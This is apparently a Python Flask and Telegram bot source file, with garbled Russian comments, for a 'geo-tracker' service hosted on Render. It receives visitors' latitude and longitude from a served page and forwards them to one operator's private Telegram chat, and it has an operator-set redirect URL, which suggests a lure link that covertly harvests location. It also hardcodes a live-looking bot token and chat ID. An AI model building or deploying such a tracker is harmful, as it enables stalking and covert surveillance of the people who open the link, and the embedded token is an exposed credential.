from flask import Flask, request, send_from_directory
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import threading
import os

app = Flask(__name__, static_folder='static')

BOT_TOKEN = '7673156387:AAF6Eop_JRvOY1dncc5ObC_CdBsAsQF2VJU'
CHAT_ID = 651911888  # –¢–æ–ª—å–∫–æ —Ç—ã –º–æ–∂–µ—à—å –ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è –±–æ—Ç–æ–º

bot = telebot.TeleBot(BOT_TOKEN)

# URL –¥–ª—è webhook —Å —Ç–≤–æ–∏–º –∞–¥—Ä–µ—Å–æ–º Render
WEBHOOK_URL = f"https://geo-tracker-l5ui.onrender.com/{BOT_TOKEN}"

# –ü–µ—Ä–µ–º–µ–Ω–Ω–∞—è –¥–ª—è —Ä–µ–¥–∏—Ä–µ–∫—Ç–∞, –º–æ–∂–Ω–æ –º–µ–Ω—è—Ç—å —á–µ—Ä–µ–∑ –±–æ—Ç–∞
redirect_url = "https://example.com"  # –ù–∞—á–∞–ª—å–Ω—ã–π URL —Ä–µ–¥–∏—Ä–µ–∫—Ç–∞

# --- –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –∫–æ–æ—Ä–¥–∏–Ω–∞—Ç –≤ Telegram ---
def send_to_telegram(lat, lon):
    text = f"üìç –ù–æ–≤–∞—è –≥–µ–æ–ª–æ–∫–∞—Ü–∏—è:\n–®–∏—Ä–æ—Ç–∞: {lat}\n–î–æ–ª–≥–æ—Ç–∞: {lon}"
    bot.send_message(CHAT_ID, text)

# --- Flask —Ä–æ—É—Ç—ã ---
@app.route('/')
def serve_index():
    return send_from_directory(app.static_folder, 'index.html')

@app.route("/send_location", methods=["POST"])
def send_location():
    data = request.json
    lat = data.get("latitude")
    lon = data.get("longitude")
    if lat and lon:
        send_to_telegram(lat, lon)
        return {"status": "ok"}
    return {"status": "error"}, 400

# --- Telegram –±–æ—Ç –∫–æ–º–∞–Ω–¥—ã –∏ –∫–Ω–æ–ø–∫–∏ ---

def check_user(message):
    return message.from_user.id == CHAT_ID

@bot.message_handler(commands=['start'])
def send_welcome(message):
    if not check_user(message):
        bot.reply_to(message, "üö´ –î–æ—Å—Ç—É–ø –∑–∞–ø—Ä–µ—â–µ–Ω.")
        return
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("–ò–∑–º–µ–Ω–∏—Ç—å —Ä–µ–¥–∏—Ä–µ–∫—Ç", callback_data="change_redirect"))
    markup.add(InlineKeyboardButton("–°–∫–∏–Ω—É—Ç—å —Å—Å—ã–ª–∫—É –Ω–∞ Render", callback_data="send_link"))
    bot.send_message(CHAT_ID, "–ü—Ä–∏–≤–µ—Ç! –í—ã–±–∏—Ä–∞–π –¥–µ–π—Å—Ç–≤–∏–µ:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def callback_inline(call):
    global redirect_url

    if call.from_user.id != CHAT_ID:
        bot.answer_callback_query(call.id, "üö´ –î–æ—Å—Ç—É–ø –∑–∞–ø—Ä–µ—â–µ–Ω.")
        return

    if call.data == "change_redirect":
        msg = bot.send_message(CHAT_ID, "–í–≤–µ–¥–∏ –Ω–æ–≤—ã–π URL –¥–ª—è —Ä–µ–¥–∏—Ä–µ–∫—Ç–∞:")
        bot.register_next_step_handler(msg, process_redirect_url)

    elif call.data == "send_link":
        bot.send_message(CHAT_ID, f"–í–æ—Ç —Ç–≤–æ—è —Å—Å—ã–ª–∫–∞ –Ω–∞ Render:\n{redirect_url}")

def process_redirect_url(message):
    global redirect_url
    if not check_user(message):
        bot.reply_to(message, "üö´ –î–æ—Å—Ç—É–ø –∑–∞–ø—Ä–µ—â–µ–Ω.")
        return
    url = message.text.strip()
    redirect_url = url
    bot.send_message(CHAT_ID, f"–†–µ–¥–∏—Ä–µ–∫—Ç –æ–±–Ω–æ–≤–ª–µ–Ω –Ω–∞:\n{redirect_url}")

# --- Webhook handler ---
@app.route(f"/{BOT_TOKEN}", methods=["POST"])
def webhook():
    json_str = request.get_data().decode("utf-8")
    update = telebot.types.Update.de_json(json_str)
    bot.process_new_updates([update])
    return "", 200

if __name__ == "__main__":
    # –°–Ω–∏–º–∞–µ–º —Å—Ç–∞—Ä—ã–π webhook (–µ—Å–ª–∏ –µ—Å—Ç—å)
    bot.remove_webhook()
    # –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º webhook –Ω–∞ —Ç–≤–æ–π URL
    bot.set_webhook(url=WEBHOOK_URL)

    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
